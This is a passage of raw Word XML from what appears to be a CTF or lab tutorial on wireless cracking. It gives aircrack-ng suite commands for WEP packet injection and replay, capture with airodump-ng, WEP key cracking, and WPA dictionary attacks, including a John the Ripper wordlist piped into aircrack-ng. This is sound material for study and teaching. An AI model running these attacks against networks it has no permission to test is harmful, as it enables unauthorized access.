          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="76168DD0"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0x0030:  ef55 d7b0 a56f bc16 355f 8986 a7ab d495  .U...o</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5_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5A4B539B"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0x0040:  1daa a308 6a70 4465 9fa6 5467 d588 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c10c  ....</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>jpDe</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Tg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D342A5"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0x0050:  f043 09f6 5418                           .C</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T.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B0658B"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273468C7" w14:textId="77777777" w:rsidR="00EB60F0"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52EE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="20A4679F"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p>
    <w:p w14:paraId="5E28039F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00954648">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>You enter “y” to select the packet and start injecting it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remember, the smaller the packet, the better. You then start injecting:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401FC1D4"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replay_src-0411-145110.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5BBE68"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3A44DD5"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Sent 10204 packets...(455 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>pps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314ACB1B" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D5EA5C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have not already started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be sure to start it now. Once you have sufficient IVs, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530A6409" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50AC9592"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airodump</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-c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00970925">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F2D5E3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="004233BD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A0422C3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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you</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> can start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and attempt to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB63648" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="784D3EC5"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aircrack</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-b 00:14:6C:7E:40:80 capture*.cap </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466E0ADF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A3D7D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Another variation of this attack is to use packets from a previous capture. You must have captured the full packets, not just the IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569D24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Here is what the command would look like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659705E7" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DCA654D"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aireplay</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-2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -r capture-01.cap wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089D3AE1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12E87F9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 ” -r capture-01.cap” is data from a previous capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C747483" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AA6B490" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="007A2212" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18D442AC" w14:textId="77777777" w:rsidR="00803B63" w:rsidRDefault="00803B63" w:rsidP="00803B63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08C30BF4" w14:textId="77777777" w:rsidR="006C69A7" w:rsidRDefault="006C69A7" w:rsidP="003C5340">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DAE3FD2" w14:textId="77777777" w:rsidR="006C69A7" w:rsidRDefault="006C69A7" w:rsidP="003C5340">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="220E8C2A" w14:textId="77777777" w:rsidR="00B20A28" w:rsidRDefault="00803B63" w:rsidP="003C5340">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>WPA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2323EC45" w14:textId="77777777" w:rsidR="0025290C" w:rsidRDefault="0025290C" w:rsidP="00803B63">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342BD1B5" w14:textId="77777777" w:rsidR="003B1BBD" w:rsidRDefault="008919ED" w:rsidP="003C5340">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="008919ED">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:19:5B:52:AD:F7 </w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD" w:rsidRPr="00C70BD1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/root/Desktop/CTF</w:t>
      </w:r>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003B1BBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>capture.cap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1018E0E7" w14:textId="77777777" w:rsidR="0025290C" w:rsidRDefault="0025290C" w:rsidP="008919ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="082296D0" w14:textId="77777777" w:rsidR="008A0D96" w:rsidRPr="001A4FDA" w:rsidRDefault="008A0D96" w:rsidP="001839A4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A4FDA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>JOHN THE RIPPER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3200589E" w14:textId="77777777" w:rsidR="008A0D96" w:rsidRPr="008274A1" w:rsidRDefault="008A0D96" w:rsidP="008A0D96">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="525481EF" w14:textId="57A03243" w:rsidR="008A0D96" w:rsidRPr="008274A1" w:rsidRDefault="008A0D96" w:rsidP="008A0D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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:~#</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>john --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>incremental:all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:19:5B:52:AD:F7 -w - /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF7355">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2578B0B9" w14:textId="77777777" w:rsidR="008919ED" w:rsidRPr="008919ED" w:rsidRDefault="008919ED" w:rsidP="008919ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22206288" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F70AD28" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">Wireshark and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
